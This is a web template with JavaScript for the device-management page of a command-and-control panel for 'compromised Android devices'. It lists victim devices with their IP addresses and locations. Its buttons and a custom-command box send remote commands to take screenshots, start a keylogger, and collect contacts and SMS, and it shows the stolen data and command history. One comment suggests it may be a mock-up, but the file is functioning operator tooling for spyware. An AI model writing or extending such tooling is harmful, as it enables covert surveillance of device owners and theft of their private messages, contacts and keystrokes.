{% extends "base.html" %}

{% block title %}Device Management - C2 Center{% endblock %}

{% block content %}
<div class="row mb-4">
    <div class="col-12">
        <h1><i class="fas fa-mobile-alt"></i> Device Management</h1>
        <p class="text-muted">Monitor and control compromised Android devices</p>
    </div>
</div>

<div class="row">
    <div class="col-lg-8">
        <div class="card">
            <div class="card-header d-flex justify-content-between align-items-center">
                <h5><i class="fas fa-list"></i> Connected Devices</h5>
                <button class="btn btn-primary btn-sm" onclick="refreshDevices()">
                    <i class="fas fa-sync"></i> Refresh
                </button>
            </div>
            <div class="card-body">
                <div class="table-responsive">
                    <table class="table table-dark table-striped">
                        <thead>
                            <tr>
                                <th>Device</th>
                                <th>Status</th>
                                <th>Android Version</th>
                                <th>IP Address</th>
                                <th>Last Seen</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="devices-table">
                            <tr>
                                <td colspan="6" class="text-center">Loading devices...</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    
    <div class="col-lg-4">
        <div class="card">
            <div class="card-header">
                <h5><i class="fas fa-terminal"></i> Quick Commands</h5>
            </div>
            <div class="card-body">
                <div class="mb-3">
                    <label class="form-label">Select Device:</label>
                    <select class="form-select" id="selected-device">
                        <option value="">Select a device...</option>
                    </select>
                </div>
                
                <div class="d-grid gap-2">
                    <button class="btn btn-danger" onclick="sendCommand('screenshot')">
                        <i class="fas fa-camera"></i> Take Screenshot
                    </button>
                    <button class="btn btn-warning" onclick="sendCommand('keylog_start')">
                        <i class="fas fa-keyboard"></i> Start Keylogger
                    </button>
                    <button class="btn btn-info" onclick="sendCommand('collect_contacts')">
                        <i class="fas fa-address-book"></i> Collect Contacts
                    </button>
                    <button class="btn btn-secondary" onclick="sendCommand('collect_sms')">
                        <i class="fas fa-sms"></i> Collect SMS
                    </button>
                    <button class="btn btn-primary" onclick="sendCommand('system_info')">
                        <i class="fas fa-info-circle"></i> System Info
                    </button>
                </div>
                
                <hr>
                
                <div class="mb-3">
                    <label class="form-label">Custom Command:</label>
                    <input type="text" class="form-control" id="custom-command" placeholder="Enter command...">
                    <button class="btn btn-outline-primary btn-sm mt-2 w-100" onclick="sendCustomCommand()">
                        <i class="fas fa-paper-plane"></i> Send Command
                    </button>
                </div>
            </div>
        </div>
        
        <div class="card mt-3">
            <div class="card-header">
                <h5><i class="fas fa-history"></i> Command History</h5>
            </div>
            <div class="card-body">
                <div class="terminal" id="command-history" style="height: 300px;">
                    <div class="text-muted">Select a device to view command history...</div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Device Details Modal -->
<div class="modal fade" id="deviceDetailsModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
        <div class="modal-content bg-dark">
            <div class="modal-header">
                <h5 class="modal-title">Device Management</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div class="row">
                    <div class="col-md-6">
                        <h6>Device Information</h6>
                        <div id="device-info">Loading...</div>
                    </div>
                    <div class="col-md-6">
                        <h6>Capabilities & Data</h6>
                        <div id="device-capabilities">Loading...</div>
                    </div>
                </div>
                <hr>
                <div class="row">
                    <div class="col-12">
                        <h6>Recent Activity</h6>
                        <div class="terminal" style="height: 200px;" id="device-activity">
                            Loading activity...
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-danger" onclick="disconnectDevice()">
                    <i class="fas fa-ban"></i> Disconnect Device
                </button>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block extra_js %}
<script>
let selectedDeviceId = null;

function loadDevices() {
    fetch('/api/devices')
        .then(response => response.json())
        .then(devices => {
            const tableBody = document.getElementById('devices-table');
            const deviceSelect = document.getElementById('selected-device');
            
            if (devices.length === 0) {
                tableBody.innerHTML = '<tr><td colspan="6" class="text-center text-muted">No devices connected</td></tr>';
                deviceSelect.innerHTML = '<option value="">No devices available</option>';
                return;
            }
            
            // Update table
            let tableHtml = '';
            devices.forEach(device => {
                const statusBadge = device.status === 'online' 
                    ? '<span class="badge bg-success">Online</span>'
                    : '<span class="badge bg-danger">Offline</span>';
                
                tableHtml += `
                    <tr>
                        <td>
                            <strong>${device.device_name}</strong><br>
                            <small class="text-muted">${device.device_id}</small>
                        </td>
                        <td>${statusBadge}</td>
                        <td>${device.android_version}</td>
                        <td>${device.ip_address}</td>
                        <td>${formatTimestamp(device.last_seen)}</td>
                        <td>
                            <button class="btn btn-primary btn-sm" onclick="showDeviceDetails('${device.device_id}')">
                                <i class="fas fa-eye"></i> View
                            </button>
                            <button class="btn btn-secondary btn-sm" onclick="selectDevice('${device.device_id}')">
                                <i class="fas fa-mouse-pointer"></i> Select
                            </button>
                        </td>
                    </tr>
                `;
            });
            tableBody.innerHTML = tableHtml;
            
            // Update select dropdown
            let selectHtml = '<option value="">Select a device...</option>';
            devices.forEach(device => {
                const status = device.status === 'online' ? 'ðŸŸ¢' : 'ðŸ”´';
                selectHtml += `<option value="${device.device_id}">${status} ${device.device_name}</option>`;
            });
            deviceSelect.innerHTML = selectHtml;
        })
        .catch(error => {
            console.error('Error loading devices:', error);
            document.getElementById('devices-table').innerHTML = 
                '<tr><td colspan="6" class="text-center text-danger">Error loading devices</td></tr>';
        });
}

function selectDevice(deviceId) {
    selectedDeviceId = deviceId;
    document.getElementById('selected-device').value = deviceId;
    loadCommandHistory(deviceId);
    showToast(`Device ${deviceId} selected`, 'info');
}

function loadCommandHistory(deviceId) {
    fetch(`/api/device/${deviceId}/commands`)
        .then(response => response.json())
        .then(commands => {
            const historyDiv = document.getElementById('command-history');
            
            if (commands.length === 0) {
                historyDiv.innerHTML = '<div class="text-muted">No command history for this device</div>';
                return;
            }
            
            let historyHtml = '';
            commands.forEach(command => {
                const statusClass = command.status === 'completed' ? 'text-success' : 
                                  command.status === 'failed' ? 'text-danger' : 'text-warning';
                
                historyHtml += `
                    <div class="log-entry">
                        <span class="log-timestamp">[${formatTimestamp(command.timestamp)}]</span>
                        <span class="log-type">${command.command}</span>
                        <span class="${statusClass}">(${command.status})</span>
                        ${command.result ? `<br><span class="log-content">${command.result.substring(0, 100)}...</span>` : ''}
                    </div>
                `;
            });
            
            historyDiv.innerHTML = historyHtml;
            historyDiv.scrollTop = historyDiv.scrollHeight;
        })
        .catch(error => {
            console.error('Error loading command history:', error);
        });
}

function sendCommand(command) {
    const deviceId = document.getElementById('selected-device').value;
    
    if (!deviceId) {
        showToast('Please select a device first', 'warning');
        return;
    }
    
    fetch(`/api/device/${deviceId}/command`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            command: command,
            parameters: '{}'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            showToast(`Command "${command}" sent successfully`, 'success');
            setTimeout(() => loadCommandHistory(deviceId), 1000);
        } else {
            showToast('Failed to send command', 'danger');
        }
    })
    .catch(error => {
        console.error('Error sending command:', error);
        showToast('Error sending command', 'danger');
    });
}

function sendCustomCommand() {
    const command = document.getElementById('custom-command').value.trim();
    const deviceId = document.getElementById('selected-device').value;
    
    if (!command) {
        showToast('Please enter a command', 'warning');
        return;
    }
    
    if (!deviceId) {
        showToast('Please select a device first', 'warning');
        return;
    }
    
    fetch(`/api/device/${deviceId}/command`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            command: command,
            parameters: '{}'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            showToast(`Custom command sent successfully`, 'success');
            document.getElementById('custom-command').value = '';
            setTimeout(() => loadCommandHistory(deviceId), 1000);
        } else {
            showToast('Failed to send command', 'danger');
        }
    })
    .catch(error => {
        console.error('Error sending command:', error);
        showToast('Error sending command', 'danger');
    });
}

function showDeviceDetails(deviceId) {
    selectedDeviceId = deviceId;
    
    // Load device info
    fetch('/api/devices')
        .then(response => response.json())
        .then(devices => {
            const device = devices.find(d => d.device_id === deviceId);
            if (!device) return;
            
            document.getElementById('device-info').innerHTML = `
                <p><strong>ID:</strong> ${device.device_id}</p>
                <p><strong>Name:</strong> ${device.device_name}</p>
                <p><strong>Android:</strong> ${device.android_version}</p>
                <p><strong>Status:</strong> <span class="badge ${device.status === 'online' ? 'bg-success' : 'bg-danger'}">${device.status}</span></p>
                <p><strong>IP:</strong> ${device.ip_address}</p>
                <p><strong>Location:</strong> ${device.location}</p>
                <p><strong>First Seen:</strong> ${formatTimestamp(device.first_seen)}</p>
                <p><strong>Last Seen:</strong> ${formatTimestamp(device.last_seen)}</p>
            `;
            
            const capabilities = Object.keys(device.capabilities).map(cap => 
                `<span class="badge bg-secondary me-1">${cap}</span>`
            ).join('');
            
            document.getElementById('device-capabilities').innerHTML = `
                <h6>Capabilities:</h6>
                <p>${capabilities || '<span class="text-muted">None reported</span>'}</p>
                <h6>Quick Stats:</h6>
                <p><strong>Data Collected:</strong> <span id="device-data-count">Loading...</span></p>
                <p><strong>Commands Executed:</strong> <span id="device-command-count">Loading...</span></p>
            `;
        });
    
    // Load device data and commands
    Promise.all([
        fetch(`/api/device/${deviceId}/data`),
        fetch(`/api/device/${deviceId}/commands`)
    ])
    .then(([dataResponse, commandsResponse]) => Promise.all([dataResponse.json(), commandsResponse.json()]))
    .then(([data, commands]) => {
        document.getElementById('device-data-count').textContent = data.length + ' items';
        document.getElementById('device-command-count').textContent = commands.length + ' commands';
        
        // Show recent activity
        let activityHtml = '';
        
        // Combine data and commands for activity feed
        const activities = [
            ...data.slice(0, 5).map(d => ({
                timestamp: d.timestamp,
                type: 'data',
                content: `Data collected: ${d.data_type}`
            })),
            ...commands.slice(0, 5).map(c => ({
                timestamp: c.timestamp,
                type: 'command',
                content: `Command executed: ${c.command} (${c.status})`
            }))
        ].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)).slice(0, 10);
        
        activities.forEach(activity => {
            const typeClass = activity.type === 'data' ? 'text-info' : 'text-warning';
            activityHtml += `
                <div class="log-entry">
                    <span class="log-timestamp">[${formatTimestamp(activity.timestamp)}]</span>
                    <span class="${typeClass}">${activity.content}</span>
                </div>
            `;
        });
        
        document.getElementById('device-activity').innerHTML = activityHtml || '<div class="text-muted">No recent activity</div>';
    });
    
    const modal = new bootstrap.Modal(document.getElementById('deviceDetailsModal'));
    modal.show();
}

function disconnectDevice() {
    if (!selectedDeviceId) return;
    
    // In a real C2, this would send a disconnect command
    showToast(`Disconnect command sent to ${selectedDeviceId}`, 'warning');
    
    const modal = bootstrap.Modal.getInstance(document.getElementById('deviceDetailsModal'));
    modal.hide();
}

function refreshDevices() {
    loadDevices();
    showToast('Device list refreshed', 'success');
}

// Real-time event handlers
socket.on('device_update', function(data) {
    loadDevices();
});

socket.on('new_command', function(data) {
    if (selectedDeviceId) {
        loadCommandHistory(selectedDeviceId);
    }
});

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    loadDevices();
    
    // Auto-refresh every 30 seconds
    setInterval(loadDevices, 30000);
    
    // Handle device selection change
    document.getElementById('selected-device').addEventListener('change', function(e) {
        if (e.target.value) {
            selectDevice(e.target.value);
        }
    });
});
</script>
{% endblock %}
